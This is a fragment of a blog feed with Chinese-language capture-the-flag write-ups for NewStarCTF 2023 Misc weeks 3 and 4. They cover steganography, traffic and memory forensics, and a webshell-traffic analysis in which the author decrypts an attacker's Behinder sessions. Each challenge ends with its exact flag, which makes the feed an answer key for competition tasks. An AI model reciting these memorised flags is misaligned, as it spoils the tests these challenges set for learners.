            "content_html": "<h1 id=\"week4\"><a class=\"markdownIt-Anchor\" href=\"#week4\">#</a> <strong>WEEK4</strong></h1>\n<h2 id=\"r通大残\"><a class=\"markdownIt-Anchor\" href=\"#r通大残\">#</a> R 通大残</h2>\n<p>题目描述：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">R通大残，打了99，补！</span><br></pre></td></tr></table></figure>\n<p>解压附件得到是一张 png，根据题目描述，猜测是有关 rgb 通道的考点，用 zsteg 一把梭了<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hD5ixSfUAJgiwhBU.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>flag{a96d2cc1-6edd-47fb-8e84-bd953205c9f5}</strong></p>\n<h2 id=\"nmap\"><a class=\"markdownIt-Anchor\" href=\"#nmap\">#</a> Nmap</h2>\n<p>题目描述：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">请给出Nmap扫描得到所有的开放端口用英文逗号分隔，端口号从小到大排列。 例如flag&#123;21,22,80,8080&#125;</span><br></pre></td></tr></table></figure>\n<p>打开流量包<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wNo7GIiJovL3jdvx.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>发现源 ip 和目标 ip 都是 127.0.0.1，自己扫自己</p>\n<p>因为是 nmap 进行的扫描，所以根据 tcp 三次握手的原理编辑语句进行过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip.dst == 127.0.0.1 and tcp.connection.synack</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7h9jWzsDV5KYNPHg.png!thumbnail\" alt=\"\"></p>\n<p>这里便是所有的开放端口了</p>\n<p><strong>flag{80,3306,5000,7000,8021,9000}</strong></p>\n<h2 id=\"3-溯源\"><a class=\"markdownIt-Anchor\" href=\"#3-溯源\">#</a> 3 - 溯源</h2>\n<p>题目描述：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在调查清楚攻击者的攻击路径后你暗暗松了一口气，但是攻击者仍控制着服务器，眼下当务之急是继续深入调查攻击者对服务器进行了什么操作，同时调查清楚攻击者的身份，请你分析攻击者与WebShell通讯的流量获取攻击者获取的相关信息，目前可以得知的是攻击者使用了冰蝎进行WebShell连接。 Tip：沿着前序题目的进度分析会更符合逻辑，或许有助于解题 FLAG格式：flag&#123;攻击者获取到的服务器用户名_服务器内网IP地址&#125; 例如flag&#123;web_10.0.0.3&#125;</span><br></pre></td></tr></table></figure>\n<p>能得到的信息有：分析 webshell 流量，需要找到用户名和内网 ip<br>\n 附件显示为冰蝎流量，而且流量包很杂，很多都是扫描流量，要解码冰蝎首要的就是找到 key</p>\n<p>搜索 shell</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ez5MvTaUwrmptWMN.png!thumbnail\" alt=\"\" title=\"fig:\">能看到这里进行了命令执行把一句话写入了 shell.php，但并不是我们需要的冰蝎马</p>\n<p>继续往下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ff6D7tFjgkb2Uwsf.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MaGFJTmNOvQ8y3eh.png!thumbnail\" alt=\"\"></p>\n<p>在这里追踪到了通过一句话木马上传冰蝎马的操作，并命名为 1.php</p>\n<p>解码请求包就能看到冰蝎马，得到 key</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1aT9dyHVLW0C6b5o.png!thumbnail\" alt=\"\"></p>\n<p>接下来就是解密通讯流量了</p>\n<p>在流 5738 解密回包得到 ip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JwWO0gikotIddqOP.png!thumbnail\" alt=\"\"></p>\n<p>在流 5735 解密第三个回包得到用户名</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/c9fqZ1VYApAMLxSO.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{www-data_172.17.0.2}</strong></p>\n<h2 id=\"依旧是空白\"><a class=\"markdownIt-Anchor\" href=\"#依旧是空白\">#</a> 依旧是空白</h2>\n<p>拿到附件利用文本直接跑 whitespace，跑不出</p>\n<p>回看 png，crc 爆破宽高</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vXuTE94wTZhoqnkR.png!thumbnail\" alt=\"\"></p>\n<p>修改高度为原先的 1044，得到密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nAoNXVj2XSIb3l8F.png!thumbnail\" alt=\"\"></p>\n<p>题目提示这次的空白格不太一样，并且已经找到了一个 pass，猜测 snow 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WEiL1SesayPAZllp.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{2b29e3e0-5f44-402b-8ab3-35548d7a6a11}</strong></p>\n<h2 id=\"第一次取证\"><a class=\"markdownIt-Anchor\" href=\"#第一次取证\">#</a> 第一次取证</h2>\n<p>给了 raw 文件，内存取证，利用工具 volatility</p>\n<p>先分析操作系统</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/t1lybfHjYt2Pbe3V.png!thumbnail\" alt=\"\"></p>\n<p>接着去找了一圈 file，发现没有找到有用信息，于是去看了下 notepad 和 editbox 内容</p>\n<p>最终在 editbox 找到了编码后的 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f dycqz.raw --profile=Win7SP1x64 editbox</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TIp8Ks4fVReKJHon.png!thumbnail\" alt=\"\"></p>\n<p>base91 编码，解码得到 flag</p>\n<p><strong>flag{a308067fc26625d31a421247adce3893}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK3/",
            "url": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK3/",
            "title": "NewStarCTF2023Misc week3",
            "date_published": "2024-04-16T05:58:19.011Z",
            "content_html": "<h1 id=\"week3\"><a class=\"markdownIt-Anchor\" href=\"#week3\">#</a> <strong>WEEK3</strong></h1>\n<h2 id=\"阳光开朗大男孩\"><a class=\"markdownIt-Anchor\" href=\"#阳光开朗大男孩\">#</a> 阳光开朗大男孩</h2>\n<p>得到两个 txt 文件</p>\n<p>flag.txt：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🌊⏩🔬🚹✉☀☺🚹🐅🎤🛩💵🌿🌊🚰😊🌊✉🐎❓🎈🌉👑🎅📮🥋👣🕹🚪☀🔄🚫🐍❓🐍😊☀🔬🍍🤣🎈🥋🙃👑🌏🐎🌊📮😂💵🏹👉❓😇🍴💧☺💵😁☃👉🎅👁☂🌿👉🍴🌪👌🍴🍵🖐😇🍍😀🗒🗒</span><br></pre></td></tr></table></figure>\n<p>secret.txt：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">法治自由公正爱国公正敬业法治和谐平等友善敬业法治富强公正民主法治和谐法治和谐法治法治公正友善敬业法治文明公正自由平等诚信平等公正敬业法治和谐平等友善敬业法治和谐和谐富强和谐富强和谐富强平等友善敬业公正爱国和谐自由法治文明公正自由平等友善敬业法治富强和谐自由法治和谐法治和谐法治和谐法治法治和谐富强法治文明公正自由公正自由公正自由公正自由</span><br></pre></td></tr></table></figure>\n<p>猜测是 emoji-aes 加密，secret 便是 key<br>\nsecret 社会主义核心价值观编码解码得到：this_password_is_s000_h4rd_p4sssw0rdddd</p>\n<p>is 后面的作为 key：<strong>s000_h4rd_p4sssw0rdddd</strong></p>\n<p>emoji-aes 解密：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uuIAzxdtHbS8YJXx.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{3m0ji_1s_s0000_1nt3rest1ng_0861aada1050}</strong></p>\n<h2 id=\"大怨种\"><a class=\"markdownIt-Anchor\" href=\"#大怨种\">#</a> 大怨种</h2>\n<p>拿到 gif 文件，使用 gifsplitter 进行分离</p>\n<p>得到二维码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xe7ADDAB9xaGT6GS.png!thumbnail\" alt=\"\"></p>\n<p>使用网站进行扫描</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcm9kdWN0cy5hc3Bvc2UuYXBwL2JhcmNvZGUvcmVjb2duaXplIw==\">https://products.aspose.app/barcode/recognize#</span></p>\n<p>得到字符串：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">666C61677B315F64306E745F6B306E775F6830775F746F5F7363346E5F746831735F633064335F61cef808a868e&#125;</span><br></pre></td></tr></table></figure>\n<p>后半段为明文字符串：cef808a868e}<br>\n 前半段进行 16 进制转换后为 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/InA9QaaKZ8hc5n7i.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{1_d0nt_k0nw_h0w_to_sc4n_th1s_c0d3_acef808a868e}</strong></p>\n<h2 id=\"2-分析\"><a class=\"markdownIt-Anchor\" href=\"#2-分析\">#</a> 2 - 分析</h2>\n<p>拿到流量包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zIeg774q7rr9NGq7.png!thumbnail\" alt=\"\"></p>\n<p>在流 30 找到了攻击者登录使用的用户名</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MreZT2KEtvVDViIf.png!thumbnail\" alt=\"\"></p>\n<p>在流 33 看到了利用 index.php 进行了一个写马的的操作，也就是说存在漏洞的文件名为 index.php，而被写入一句话木马的文件 wh1t3g0d.php 便是 webshell 文件名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;best_admin_index.php_wh1t3g0d.php&#125;</span><br></pre></td></tr></table></figure>\n<p>将括号内 md5 之后便是 flag<br>\n<strong>flag{*</strong>*4069afd7089f7363198d899385ad688b}**</p>\n<h2 id=\"键盘侠\"><a class=\"markdownIt-Anchor\" href=\"#键盘侠\">#</a> 键盘侠</h2>\n<p>同样是一个流量包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5MgDDo9iioNDSYKS.png!thumbnail\" alt=\"\"></p>\n<p>发现是 usb 的流量，又是老知识点了</p>\n<p>先翻翻流量看看 data 数据</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SJNeG6XmjBzsUU3V.png!thumbnail\" alt=\"\"></p>\n<p>发现 HID data 是 8 字节的数据，猜测为键盘流量，先用 tshark 进行导出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tshark -r draobyek.pcapng -T fields -e usbhid.data &gt; usbdata.txt</span><br></pre></td></tr></table></figure>\n<p>得到 usbdata.txt 之后再进行删除空行添加冒号的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">info = &#x27;&#x27;&#x27;</span><br><span class=\"line\">kali下运行：</span><br><span class=\"line\">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class=\"line\">提取流量包信息</span><br><span class=\"line\">然后通过该脚本可以过滤掉空格和其他内容，并且添加冒号</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(info)</span><br><span class=\"line\"></span><br><span class=\"line\">f_data = input(&quot;请输入带处理txt文件的路径：&quot;)</span><br><span class=\"line\">shujian = int(input(&quot;鼠标流量信息请输入8，键盘流量请输入16：&quot;))</span><br><span class=\"line\">f = open(f_data, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 整理到out.txt</span><br><span class=\"line\">with open(&#x27;out.txt&#x27;, &#x27;w&#x27;) as f_out:</span><br><span class=\"line\">    for i in f.readlines():</span><br><span class=\"line\">        s = i.strip()</span><br><span class=\"line\">        # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">        if len(s) == shujian:</span><br><span class=\"line\">            # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]</span><br><span class=\"line\">            ns = &quot;:&quot;.join(nsl)</span><br><span class=\"line\">            f_out.write(ns)</span><br><span class=\"line\">            f_out.write(&#x27;\\n&#x27;)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hhTygsJYNnbzlQwI.png!thumbnail\" alt=\"\"></p>\n<p>得到 out.txt</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/oiaDrRFILXOpqUjS.png!thumbnail\" alt=\"\"></p>\n<p>再用脚本进行对照解密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">#脚本处理完的文件（为冒号分隔的文件）</span><br><span class=\"line\">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\">shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\">output = []</span><br><span class=\"line\">keys = open(&#x27;out.txt&#x27;)</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;:</span><br><span class=\"line\">             continue</span><br><span class=\"line\">        if line[6:8] in normalKeys.keys():</span><br><span class=\"line\">            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;]</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            output += [&#x27;[unknown]&#x27;]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">keys.close()</span><br><span class=\"line\"></span><br><span class=\"line\">flag=0</span><br><span class=\"line\">print(&quot;&quot;.join(output))</span><br><span class=\"line\">for i in range(len(output)):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        a=output.index(&#x27;&lt;DEL&gt;&#x27;)</span><br><span class=\"line\">        del output[a]</span><br><span class=\"line\">        del output[a-1]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">for i in range(len(output)):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if output[i]==&quot;&lt;CAP&gt;&quot;:</span><br><span class=\"line\">            flag+=1</span><br><span class=\"line\">            output.pop(i)</span><br><span class=\"line\">            if flag==2:</span><br><span class=\"line\">                flag=0</span><br><span class=\"line\">        if flag!=0:</span><br><span class=\"line\">            output[i]=output[i].upper()</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">print (&#x27;output :&#x27; + &quot;&quot;.join(output))</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">w3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;2023&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vbafjwrisgjadwwiihdgja13882hxbbbna\t&lt;CAP&gt;&lt;CAP&gt;ff&lt;DEL&gt;lll&lt;DEL&gt;&lt;DEL&gt;aaa&lt;DEL&gt;&lt;DEL&gt;gggg&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#123;999&lt;DEL&gt;&lt;DEL&gt;999&lt;DEL&gt;&lt;DEL&gt;11&lt;DEL&gt;9aaa&lt;DEL&gt;&lt;DEL&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;eb2---&lt;DEL&gt;&lt;DEL&gt;a450---&lt;DEL&gt;&lt;DEL&gt;2f5f&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;--&lt;DEL&gt;7bfc[unknown][unknown][unknown]-8989&lt;DEL&gt;&lt;DEL&gt;dfdf&lt;DEL&gt;&lt;DEL&gt;4bfa4bfa&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;85848584&#125;&#125;&#125;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#125;]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;nice&lt;SPACE&gt;work!1you&lt;SPACE&gt;got&lt;SPACE&gt;this&lt;SPACE&gt;flag</span><br><span class=\"line\">output :w3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;2023&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vbafjwrisgjadwwiihdgja13882hxbbbna\t&lt;CAP&gt;FLAG&#123;9919AEB2-A450-2F5F-7BFC[UNKNOWN][UNKNOWN][UNKNOWN]-89DF4BFA8584&#125;]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;NICE&lt;SPACE&gt;WORK!1YOU&lt;SPACE&gt;GOT&lt;SPACE&gt;THIS&lt;SPACE&gt;FLAG</span><br></pre></td></tr></table></figure>\n<p>在上一行可以看到解出来的其实是小写字母，于是把 FLAG {9919AEB2-A450-2F5F-7BFC-89DF4BFA8584} 换成小写就是最终 flag 了<br>\n<strong> flag {9919aeb2-a450-2f5f-7bfc-89df4bfa8584}</strong></p>\n<h2 id=\"滴滴滴\"><a class=\"markdownIt-Anchor\" href=\"#滴滴滴\">#</a> 滴滴滴</h2>\n<p>拿到一张图片和一个音频，听了下应该是手机拨号的声音，还是老知识点了：DTMF 拨号音识别</p>\n<p>利用 dtmf2num 命令进行识别</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dtmf2num 奇怪的音频.wav</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Rn9UVgO1Xjx905Mu.png!thumbnail\" alt=\"\"></p>\n<p>得到号码 52563319066，根据题目提示这应该是作为 jpg 的密码，猜测为 steghide 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V8RYV0vHbQDeYKMz.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{1nf0rm4t10n_s3cur1ty_1s_a_g00d_j0b_94e0308b}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK2/",
            "url": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK2/",
            "title": "NewStarCTF2023Misc week2",
            "date_published": "2024-04-16T05:58:19.010Z",
